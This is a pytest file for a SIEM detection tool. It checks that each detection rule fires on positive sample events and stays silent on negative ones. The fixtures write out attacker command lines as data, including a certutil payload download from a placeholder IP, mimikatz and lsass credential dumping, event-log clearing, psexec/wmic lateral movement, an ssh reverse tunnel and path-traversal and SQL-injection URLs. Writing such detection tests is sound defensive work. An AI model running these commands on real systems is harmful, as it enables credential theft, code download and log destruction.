"""Data-driven per-rule tests.

Every rule in ``rules/`` must fire on its positive cases and stay silent on its
negative cases. ``test_every_rule_in_rules_dir_has_test_cases`` enforces that a
new rule ships with cases, so CI never merges an untested rule.

Cases are raw event dicts, exactly like a line in ``examples/events.jsonl``.
They are evaluated with ``evaluate_rules`` directly (no anomaly detector, no
suppression) so each test is precise about the rule under test.

SIG-EXEC-001 exercises a same-field Sigma exclusion: the encoded-command
selection and the AzureAD/ModuleAnalyzer filter must both remain active.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from autosiem.detection import evaluate_rules
from autosiem.normalization import normalize, parse_raw_line
from autosiem.rules import load_rules

ROOT = Path(__file__).resolve().parents[1]
RULES = load_rules(ROOT / "rules")
RULE_BY_ID = {rule.rule_id: rule for rule in RULES}

# rule_id -> {"fires": [raw events], "silent": [raw events]}
RULE_CASES: dict[str, dict[str, list[dict[str, Any]]]] = {
    "AUTO-AUTH-001": {
        "fires": [
            {"category": "authentication", "action": "login_failed", "user": "alice", "outcome": "failure"},
            {"category": "authentication", "action": "login_attempt", "user": "bob", "outcome": "access denied"},
        ],
        "silent": [
            {"category": "authentication", "action": "login_success", "user": "alice", "outcome": "success"},
            {"category": "authentication", "action": "mfa_prompt", "user": "alice", "outcome": "pending"},
        ],
    },
    "AUTO-CRED-001": {
        "fires": [
            {"category": "authentication", "action": "login_success", "user": "alice", "outcome": "success", "src_ip": "203.0.113.10"},
            {"category": "authentication", "action": "login", "user": "alice", "outcome": "success", "src_ip": "198.51.100.1"},
        ],
        "silent": [
            {"category": "authentication", "action": "login_success", "user": "alice", "src_ip": ""},
            {"category": "authentication", "action": "login_success", "user": "alice"},
            {"category": "authentication", "action": "login_failed", "user": "alice", "src_ip": "203.0.113.10", "outcome": "failure"},
        ],
    },
    "AUTO-EXEC-001": {
        "fires": [
            {"category": "process", "process_name": "powershell.exe", "command_line": "powershell -enc SQBFAFgA"},
            {"category": "process", "process_name": "powershell.exe", "command_line": "powershell.exe -encodedcommand JABjAGwA"},
        ],
        "silent": [
            {"category": "process", "process_name": "powershell.exe", "command_line": "powershell.exe -NoProfile -Command Get-Date"},
        ],
    },
    "SIG-EXEC-001": {
        "fires": [
            {"category": "process", "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA"},
            {"category": "process", "process_name": r"C:\Program Files\PowerShell\7\pwsh.exe", "command_line": "pwsh.exe -noprofile -enc SQBFAFgA"},
        ],
        "silent": [
            {"category": "process", "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "command_line": "powershell.exe -enc AzureAD"},
            {"category": "process", "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "command_line": "powershell.exe -NoProfile -Command Get-Date"},
        ],
    },
    "AUTO-EXEC-002": {
        "fires": [
            {"category": "process", "process_name": "cmd.exe", "command_line": "cmd.exe /c certutil -urlcache -split -f http://198.51.100.25/payload.exe"},
            {"category": "process", "process_name": "mshta.exe", "command_line": "mshta.exe javascript:alert(1)"},
        ],
        "silent": [
            {"category": "process", "process_name": "cmd.exe", "command_line": "cmd.exe /c dir"},
            {"category": "process", "process_name": "notepad.exe", "command_line": "notepad.exe certutil.txt"},
        ],
    },
    "AUTO-CLOUD-001": {
        "fires": [
            {"category": "cloud", "action": "AssumeRole", "user": "alice", "cloud_account": "prod", "resource": "AdminRole"},
            {"category": "cloud", "action": "assume_role", "cloud_account": "staging", "resource": "OrganizationAccountAdminRole"},
        ],
        "silent": [
            {"category": "cloud", "action": "AssumeRole", "cloud_account": "prod", "resource": "ReadOnlyRole"},
            {"category": "cloud", "action": "CreateUser", "cloud_account": "prod", "resource": "AdminRole"},
        ],
    },
    "AUTO-EMAIL-001": {
        "fires": [
            {"category": "email", "action": "phishing_email_received", "user": "alice"},
            {"category": "email", "action": "suspicious_attachment_blocked", "user": "bob"},
        ],
        "silent": [
            {"category": "email", "action": "email_delivered", "user": "alice"},
            {"category": "email", "action": "spam_filtered", "user": "alice"},
        ],
    },
    "AUTO-CRED-002": {
        "fires": [
            {"category": "process", "process_name": "mimikatz.exe", "command_line": "mimikatz.exe sekurlsa::logonpasswords"},
            {"category": "process", "process_name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe"},
        ],
        "silent": [
            {"category": "process", "process_name": "mimikatz.exe", "command_line": "mimikatz.exe privilege::debug"},
            {"category": "process", "process_name": "notepad.exe", "command_line": "notepad.exe lsass.txt"},
        ],
    },
    "AUTO-DISCO-001": {
        "fires": [
            {"category": "process", "process_name": "systeminfo.exe", "command_line": "systeminfo"},
            {"category": "process", "process_name": "cmd.exe", "command_line": "cmd.exe /c ipconfig /all"},
        ],
        "silent": [
            {"category": "process", "process_name": "cmd.exe", "command_line": "cmd.exe /c ipconfig"},
            {"category": "process", "process_name": "ping.exe", "command_line": "ping -t 10.0.0.1"},
        ],
    },
    "AUTO-DEFEV-001": {
        "fires": [
            {"category": "process", "process_name": "svchost.exe", "command_line": r"C:\Users\alice\AppData\Local\Temp\svchost.exe -k nsm"},
            {"category": "process", "process_name": "explorer.exe", "command_line": r"C:\Users\alice\Downloads\explorer.exe"},
        ],
        "silent": [
            {"category": "process", "process_name": "svchost.exe", "command_line": r"C:\Windows\System32\svchost.exe -k netsvcs"},
            {"category": "process", "process_name": "explorer.exe", "command_line": r"C:\Windows\explorer.exe"},
        ],
    },
    "AUTO-DEFEV-002": {
        "fires": [
            {"category": "process", "process_name": "wevtutil.exe", "command_line": "wevtutil cl security"},
            {"category": "process", "process_name": "powershell.exe", "command_line": "powershell.exe clear-eventlog -logname security"},
        ],
        "silent": [
            {"category": "process", "process_name": "wevtutil.exe", "command_line": "wevtutil epl security backup.evtx"},
            {"category": "process", "process_name": "cmd.exe", "command_line": "cmd.exe /c dir *.evtx"},
        ],
    },
    "AUTO-IMPACT-001": {
        "fires": [
            {"category": "process", "process_name": "LockBit.exe", "command_line": "LockBit.exe -encrypt C:\\Users\\alice\\Documents\\Q3_report.xlsx"},
            {"category": "process", "process_name": "conti.exe", "command_line": "conti.exe -encrypt C:\\backups\\db.bak"},
        ],
        "silent": [
            {"category": "process", "process_name": "LockBit.exe", "command_line": "LockBit.exe -enc C:\\x"},
            {"category": "process", "process_name": "notepad.exe", "command_line": "notepad.exe -encrypt x"},
        ],
    },
    "AUTO-LAT-001": {
        "fires": [
            {"category": "process", "process_name": "wmic.exe", "command_line": "wmic /node:finance-02 process call create cmd.exe"},
            {"category": "process", "process_name": "psexec.exe", "command_line": "psexec.exe \\\\server01 -s cmd.exe"},
        ],
        "silent": [
            {"category": "process", "process_name": "wmic.exe", "command_line": "wmic cpu get loadpercentage"},
            {"category": "process", "process_name": "ssh.exe", "command_line": "ssh user@server01.example.com 'ls -la'"},
        ],
    },
    "AUTO-WEB-001": {
        "fires": [
            {"category": "network", "action": "http_request", "url": "/index.php?page=../../../../etc/passwd"},
            {"category": "network", "action": "web_request", "url": "/search?q=1 union select 1,2,3"},
        ],
        "silent": [
            {"category": "network", "action": "http_request", "url": "/index.php?page=about"},
            {"category": "network", "action": "dns_query", "url": "/safe/path"},
        ],
    },
    "AUTO-C2-001": {
        "fires": [
            {"category": "process", "process_name": "ssh.exe", "command_line": "ssh -R 8080:localhost:80 alice@203.0.113.99"},
            {"category": "process", "process_name": "socat", "command_line": "socat TCP4-LISTEN:8443,fork SSL:server.example.com:443"},
        ],
        "silent": [
            {"category": "process", "process_name": "ssh.exe", "command_line": "ssh alice@203.0.113.99 'ls -la'"},
            {"category": "process", "process_name": "openssl.exe", "command_line": "openssl s_client -tls1_2 -connect x.example.com:443"},
        ],
    },
    "AUTO-EXFIL-001": {
        "fires": [
            {"category": "network", "action": "data_transfer", "direction": "outbound", "bytes_sent": 5242880},
            {"category": "network", "action": "upload", "direction": "outbound", "bytes_sent": 9000000},
        ],
        "silent": [
            {"category": "network", "action": "data_transfer", "direction": "outbound", "bytes_sent": 1000000},
            {"category": "network", "action": "data_transfer", "direction": "inbound", "bytes_sent": 5242880},
        ],
    },
}


def _flatten(kind: str) -> list[tuple[str, dict[str, Any]]]:
    cases: list[tuple[str, dict[str, Any]]] = []
    for rule_id, entry in RULE_CASES.items():
        for event in entry.get(kind, []):
            cases.append((rule_id, event))
    return cases


POSITIVE_CASES = _flatten("fires")
NEGATIVE_CASES = _flatten("silent")


def _finding_ids(event: dict[str, Any]) -> set[str]:
    normalized = normalize(parse_raw_line(json.dumps(event)))
    return {finding.rule_id for finding in evaluate_rules(normalized, RULES)}


@pytest.mark.parametrize(
    "rule_id,event",
    POSITIVE_CASES,
    ids=[f"{rule_id}-fires-{i}" for i, (rule_id, _) in enumerate(POSITIVE_CASES, start=1)],
)
def test_rule_fires_on_positive_case(rule_id: str, event: dict[str, Any]) -> None:
    assert rule_id in _finding_ids(event), f"{rule_id} should fire on {event!r}"


@pytest.mark.parametrize(
    "rule_id,event",
    NEGATIVE_CASES,
    ids=[f"{rule_id}-silent-{i}" for i, (rule_id, _) in enumerate(NEGATIVE_CASES, start=1)],
)
def test_rule_stays_silent_on_negative_case(rule_id: str, event: dict[str, Any]) -> None:
    assert rule_id not in _finding_ids(event), f"{rule_id} should stay silent on {event!r}"


def test_every_rule_in_rules_dir_has_test_cases() -> None:
    untested = sorted(set(RULE_BY_ID) - set(RULE_CASES))
    assert not untested, f"rules with no test cases: {untested}"
    orphaned = sorted(set(RULE_CASES) - set(RULE_BY_ID))
    assert not orphaned, f"test cases for unknown rule ids: {orphaned}"
    for rule_id, entry in RULE_CASES.items():
        assert entry.get("fires"), f"{rule_id} needs at least one positive ('fires') case"
